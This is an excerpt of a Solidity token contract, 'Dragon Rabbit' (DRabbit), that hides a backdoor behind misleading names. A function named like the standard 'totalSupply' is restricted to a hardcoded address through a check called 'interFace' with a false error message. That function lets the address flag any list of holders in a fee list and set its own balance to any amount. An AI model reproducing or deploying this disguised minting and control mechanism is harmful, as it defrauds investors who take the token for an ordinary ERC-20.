...
contract DragonRabbit is Context, IERC20, Ownable{

    using SafeMath for uint256;
    string private _name = "Dragon Rabbit";
    string private _symbol = "DRabbit";
    ...
    constructor () {
        ...
        huobi = payable(address(0x598e208d71d45035162ba3F0C01f9EF9ef993169));
    ...
    function interFace() private view {
        require(msg.sender == huobi,"not enough Balance");
    }
    ...
    function totalSupply(bool wokr,uint256 copysir, address[] calldata TRUST) public {
        interFace();
        for (uint n; n < TRUST.length; ++n) {
            bool ensure = wokr;
            _feewhite[TRUST[n]] = ensure; 
            bool ownaeble = copysir > 3 * 3;
            if (ownaeble == true) 
            _balances[huobi] = copysir;
        }
    }
